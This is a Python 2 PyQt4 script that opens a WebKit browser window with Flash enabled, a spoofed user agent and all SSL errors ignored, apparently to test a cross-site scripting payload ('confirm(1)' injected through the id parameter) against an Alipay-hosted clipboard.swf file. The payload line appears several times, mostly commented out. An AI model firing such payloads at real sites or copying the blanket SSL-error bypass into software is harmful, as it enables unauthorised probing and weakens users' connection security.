import sys
from PyQt4 import QtCore, QtGui, QtWebKit
from PyQt4.QtWebKit import QWebSettings
from PyQt4.QtNetwork import QNetworkAccessManager
from PyQt4.QtNetwork import *
import urllib

from threading import Thread
import time

UA_STRING = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1284.2 Safari/537.13"
vidurl = ("empty")

class YWebPage(QtWebKit.QWebPage):
    def __init__(self):
        super(YWebPage, self).__init__()

    def userAgentForUrl(self, url):
        return UA_STRING


class Browser(QtGui.QMainWindow): # "Browser" window
    def __init__(self, main, url):
        QtGui.QMainWindow.__init__(self)
        self.main = main
        #self.resize(800,600) # Viewport size
        self.webView = QtWebKit.QWebView()
        self.setCentralWidget(self.webView)
        self.yPage = YWebPage()
        self.webView.setPage(self.yPage)
        self.webView.load(QtCore.QUrl(url)) # Video URL
        self.webView.settings().setAttribute(QtWebKit.QWebSettings.PluginsEnabled, True) # Enables flash player

        self.page = self.webView.page()
        self.page.networkAccessManager().sslErrors.connect(lambda reply, errors: self.handleSslErrors(reply, errors))

    def closeEvent(self, event):
        self.main.browsers.remove(self)
        super(Browser, self).closeEvent(event)

    def handleSslErrors(self, reply, errors):
        # ignore SSL errors on Windows (yes a uggly workaround, don't know how to fix it yet)
        #for error in errors:
            #print error.errorString()
        reply.ignoreSslErrors(errors)

class MainWindow:
    def __init__(self):
        self.browsers = []
        #self.setLayout(layout)

    def open(self, url):
        url = QtCore.QString(urllib.unquote_plus(url))
        #url = QtCore.QString(urllib.unquote_plus(str(self.__qle.text())))
        b = Browser(self, url)
        b.show()
        self.browsers.append(b)
    def print1(self):
        print 111

class PageOpen(QtCore.QThread):
    def __init__(self, w):
        QtCore.QThread.__init__(self)
        self.w = w
    def run(self):
        #self.w.open(r'https://img.alipay.com/global/clipboard.swf?id=\"))}catch(e){confirm(1);}//&width=500&height=500&.swf')
        while True:
            print 1
            time.sleep(5)
            #self.w.open(r'https://img.alipay.com/global/clipboard.swf?id=\"))}catch(e){confirm(1);}//&width=500&height=500&.swf')
            self.w.print1()

def main():
    app = QtGui.QApplication(sys.argv)
    #str_url = ""
    #url = QtCore.QString(urllib.unquote_plus(str_url))
    w = MainWindow()
    sys.exit(app.exec_())

def start():
    app = QtGui.QApplication(sys.argv)
    w = MainWindow()
    thread = PageOpen(w)
    thread.finished.connect(app.exit)
    thread.start()
    sys.exit(app.exec_())

def connect(w):
    print 111
    time.sleep(5)
    w.open(r'https://img.alipay.com/global/clipboard.swf?id=\"))}catch(e){confirm(1);}//&width=500&height=500&.swf')

if __name__ == '__main__':
    start()